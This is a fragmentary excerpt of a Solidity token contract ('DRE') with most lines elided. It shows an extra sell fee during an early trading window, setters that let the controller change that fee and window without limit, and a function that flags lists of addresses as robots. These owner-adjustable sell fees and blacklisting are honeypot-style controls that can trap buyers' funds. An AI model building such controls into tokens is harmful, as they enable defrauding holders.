...
contract DRE is IERC20, Ownable {
	...
	uint256 private sellTimeLimit = 28800;
	...
	uint256 public _sellLimitFee = 9;
    ...
    constructor (){
        ...
        _fist = 0x767B04D1F1ddE2A056CEc1AB3bD51d1C286366Db;
		...
		IERC20(usdtToken).approve(address(swapRouter), MAX);
        ...
        fundAddress = 0xfe8Da88617ceC3cA9ef5494B0126a6721d89f4E1;
        ...
        holderRewardCondition = 1 * 10 ** IERC20(_fist).decimals();
    ...
    function _tokenTransfer(
        ...
        if (takeFee && 0 < startTradeBlock) {
            ...
            uint256 swapFee;
            if (isSell) {
				if(startTradeBlock + sellTimeLimit > block.number){
					swapFee = _sellFundFee + _sellLPDividendFee + _sellLimitFee;
				}else{
	...
	function setSellLimitFee(uint256 fundFee) external onlyFunder {
        _sellLimitFee = fundFee;
    }
	...
	function setSellTimeLimit(uint256 _value) external onlyFunder {
        sellTimeLimit = _value;
    }
	...
	function setIsRobot(address[] calldata addList,bool _value) external onlyFunder {
		for(uint256 i = 0; i < addList.length; i++) {
